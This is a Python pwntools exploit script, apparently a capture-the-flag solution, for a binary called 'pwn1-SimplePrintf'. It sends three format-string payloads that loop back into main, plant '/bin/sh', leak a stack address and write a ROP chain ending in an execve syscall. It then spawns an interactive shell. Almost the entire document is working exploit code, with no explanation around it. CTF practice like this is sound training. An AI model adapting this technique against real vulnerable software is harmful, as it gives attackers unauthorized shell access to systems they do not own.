from pwn import *
from libformatstr import * # this package is from https://github.com/Kyle-Kyle/libformatstr
import time

# config
context.bits = 64
context.arch = 'amd64'
#context.log_level = 'debug'
prsi = 0x0000000000401837
prdi = 0x00000000004005d5
prax_pp = 0x0000000000479836# : pop rax ; pop rdx ; pop rbx ; ret
ret = 0x00000000004002f6
syscall = 0x0000000000468205

# get offset 
#def exec_fmt(payload):
#    p = process('./pwn1-SimplePrintf')
#    p.sendline(payload)
#    return p.recv()
#
#res = get_offset(exec_fmt, isx64=1)

# first payload: inject /bin/sh\x00, leak stack and call main again
f = FormatStr(isx64=1, auto_sort=False)
f[0x6cb020] = (0x0b6a, 2)       # main
f[0x6cb022] = (0x40, 1)         # main
f[0x6cb000] = (0x12345678, 2)   # to call main
r = process('./pwn1-SimplePrintf')
payload = '%pAAAAAA'+f.payload(7, start_len=20)+'/bin/sh\x00'
print 'payload1 length: 0x%x' % len(payload)
r.sendline(payload)
target = int(r.recv(14)[2:], 16)-0x93+0x1c8     # pointer to return address
bin_sh = target-0x248+0x178                      # address of /bin/sh\x00
log.info('target address: 0x%x' % target)
log.info('/bin/sh address: 0x%x' % bin_sh)
bin_sh_low = u64(p64(bin_sh)[0:4]+'\x00'*4)
bin_sh_high = u64(p64(bin_sh)[4:8]+'\x00'*4)

# second payload: first part of rop chain
f = FormatStr(isx64=1, auto_sort=True)
f[target] = (prax_pp, 8)
f[target+0x8] = (0x3b, 8)
f[target+0x10] = (0, 8)
f[target+0x18] = (0, 8)
f[target+0x20] = (prsi, 8)
f[target+0x28] = (0, 8)
f[target+0x30] = (prdi, 8)

payload = f.payload(6, start_len=0)
print 'payload2 length: 0x%x' % len(payload)
r.sendline(payload)

# third payload: second part of rop chain
f = FormatStr(isx64=1, auto_sort=True, sort_start=3)
f[0x6cb021] = (0x02, 1)
f[0x6cb022] = (0x40, 1)
f[0x6cb020] = (0xf6, 1)         # stop calling main
f[target+0x38] = (bin_sh, 8)
f[target+0x40] = (syscall, 8)
payload = f.payload(6, start_len=0)
print 'payload3 length: 0x%x' % len(payload)
r.sendline(payload)
r.clean()
r.sendline('ls')
r.clean()
r.interactive()
